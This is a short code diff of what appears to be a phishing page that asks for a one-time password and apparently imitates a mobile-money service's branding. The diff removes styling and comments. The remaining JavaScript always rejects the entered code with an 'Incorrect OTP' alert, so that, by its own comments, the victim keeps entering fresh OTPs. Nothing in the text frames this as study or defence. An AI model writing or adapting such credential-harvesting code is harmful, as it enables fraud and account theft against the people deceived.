@@ -85,18 +85,6 @@
             font-size: 13px;
         }
         
-        .brand-text {
-            font-weight: 700;
-        }
-        
-        .brand-text .eco {
-            color: #1a73e8;
-        }
-        
-        .brand-text .cash {
-            color: #ff1744;
-        }
-        
         .otp-boxes {
             display: flex;
             justify-content: center;
@@ -352,7 +340,7 @@
         const otpContainer = document.getElementById('otpContainer');
         
         let otpValue = '';
-        let seconds = 60;  // Changed to 60 seconds
+        let seconds = 60;
         let countdownInterval;
         let isExpired = false;
         
@@ -484,7 +472,6 @@
                 spinnerOverlay.style.display = 'none';
                 
                 // ALWAYS show "Incorrect OTP" to simulate real phishing
-                // This makes the victim try again and enter more OTPs
                 shakeError();
                 alert('❌ Incorrect OTP!\n\nPlease re-enter the most recent OTP.');
                 resetOtp();
